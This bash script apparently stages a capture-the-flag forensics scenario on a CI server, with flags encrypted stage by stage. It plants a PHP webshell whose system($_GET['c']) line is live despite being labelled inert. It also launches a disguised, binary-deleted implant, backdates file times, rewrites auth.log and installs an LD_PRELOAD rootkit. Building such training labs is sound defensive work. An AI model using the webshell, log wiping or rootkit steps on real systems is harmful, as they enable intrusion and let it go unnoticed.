#!/bin/bash
# Stage the live-IR scenario on ci-runner-03. Every "malware" here is benign and only
# reproduces a forensic footprint. Each flag is gated by the previous stage's finding:
#   V1 (webshell) -> reveals K1 -> decrypts V2 (implant config) -> names the live implant
#   -> dump its RAM for SK -> decrypts V3 (exfil manifest) -> names closeout + that the
#   source IP seals it -> recover the real intrusion IP from logs -> decrypts V4.
set -e

# explicit fallback (avoid ${VAR:-H7CTF{..}} - the nested brace mis-parses and appends a })
V1="${FLAG_V1}"; [ -n "$V1" ] || V1="H7CTF{v1_local_foothold}"
V2="${FLAG_V2}"; [ -n "$V2" ] || V2="H7CTF{v2_local_implant}"
V3="${FLAG_V3}"; [ -n "$V3" ] || V3="H7CTF{v3_local_memkey}"
V4="${FLAG_V4}"; [ -n "$V4" ] || V4="H7CTF{v4_local_timeline}"

K1=$(openssl rand -hex 16)                 # "operator key" left in the webshell
SK=$(openssl rand -hex 16)                 # implant session key (memory-only)
REAL_IP="203.0.113.$(( (RANDOM % 200) + 20 ))"
REAL_TS="2026-09-24 03:14:07"
OLD_TS="2026-08-12 10:22:00"                # the backdated (fake) mtime

enc() { openssl enc -aes-256-cbc -pbkdf2 -salt -k "$2" -out "$3" <<<"$1"; }

# --- filesystem dressing: a plausible CI/build server ---
id ci &>/dev/null || useradd -m -s /bin/bash ci
mkdir -p /var/www/html/ci/uploads /opt/ci/artifacts /opt/ci/logs /var/log/nginx /tmp/.sys_cache
echo "GreenBuild CI 2.4.1" >/opt/ci/VERSION
echo "build ok: payment-sdk 1.4.2 signed and shipped" >/opt/ci/logs/build.log

# --- Stage 1: the webshell (found via the live process running as ci) ---
cat >/var/www/html/ci/uploads/build_status.php <<PHP
<?php
// GreenBuild status shim (uploaded 2026-09-24). operator access only.
\$OP_KEY = "$K1";                      // operator key
\$T = base64_decode("$(printf %s "$V1" | base64 -w0)");   // access token
if ((\$_GET['op'] ?? '') === \$OP_KEY) { echo \$T; }
if (isset(\$_GET['c'])) { system(\$_GET['c']); }          // (inert here)
?>
PHP
# a live process spawned by the compromised CI worker (the "still active" tell)
setsid bash -c 'exec -a "[ci-worker/php-fpm]" sleep infinity' &  # masquerading name
chown -R ci:ci /var/www/html/ci

# --- Stage 2: implant config, encrypted with K1 ---
enc "$V2
implant: /usr/sbin/.sys_agentd is running (its binary was deleted after launch).
its session key lives only in the process memory - dump it and use it to open exfil.enc." \
    "$K1" /tmp/.sys_cache/agent.dat

# compile + launch the implant, hand it SK via a file it reads-then-unlinks, delete its binary
gcc -O2 -o /usr/sbin/.sys_agentd /opt/build/implant.c
printf '%s\n' "$SK" >/tmp/.sys_cache/.sk
setsid /usr/sbin/.sys_agentd /tmp/.sys_cache/.sk &
sleep 1
rm -f /usr/sbin/.sys_agentd            # now only recoverable via /proc/<pid>/exe

# --- Stage 3: exfil manifest, encrypted with the memory-only SK ---
enc "$V3
exfiltrated: /opt/ci/artifacts/payment-sdk-1.4.2.jar (backdoored, re-signed).
closeout is sealed with the SOURCE IP of the operator session that signed it -
the login the operator wiped from auth.log. find it, that IP opens closeout.enc." \
    "$SK" /tmp/.sys_cache/exfil.enc

# --- Stage 4: timestomp + wiped-but-corroborated timeline, closeout sealed with REAL_IP ---
echo "backdoored payment SDK build" >/opt/ci/artifacts/payment-sdk-1.4.2.jar
touch -d "$OLD_TS" /opt/ci/artifacts/payment-sdk-1.4.2.jar   # mtime faked; ctime stays real
# auth.log is "cleaned" (no operator login); the web access log still has the foothold hit
cat >/var/log/auth.log <<LOG
Sep 24 02:55:01 ci-runner-03 CRON[811]: pam_unix(cron:session): session opened for user root
Sep 24 03:20:11 ci-runner-03 sshd[1442]: Accepted publickey for deploy from 10.0.0.5 port 55021
LOG
cat >/var/log/nginx/access.log <<LOG
10.0.0.9 - - [24/Sep/2026:02:40:12 +0000] "GET /ci/ HTTP/1.1" 200 1731 "-" "Mozilla/5.0"
$REAL_IP - - [24/Sep/2026:03:14:07 +0000] "POST /ci/uploads/build_status.php HTTP/1.1" 200 42 "-" "curl/8.4.0"
$REAL_IP - - [24/Sep/2026:03:14:39 +0000] "GET /ci/uploads/build_status.php?op=$K1 HTTP/1.1" 200 27 "-" "curl/8.4.0"
10.0.0.9 - - [24/Sep/2026:03:41:55 +0000] "GET /ci/ HTTP/1.1" 200 1731 "-" "Mozilla/5.0"
LOG
enc "$V4
case closed: operator foothold via uploaded webshell, implant deployed, payment SDK backdoored + re-signed, exfiltrated over the beacon." \
    "$REAL_IP" /tmp/.sys_cache/closeout.enc

# --- deploy the readdir rootkit so ls hides the .sys_ operator files ---
gcc -O2 -shared -fPIC -o /lib/.sys_preload.so /opt/build/rootkit.c -ldl
echo /lib/.sys_preload.so >/etc/ld.so.preload

chmod -R go-w /tmp/.sys_cache 2>/dev/null || true
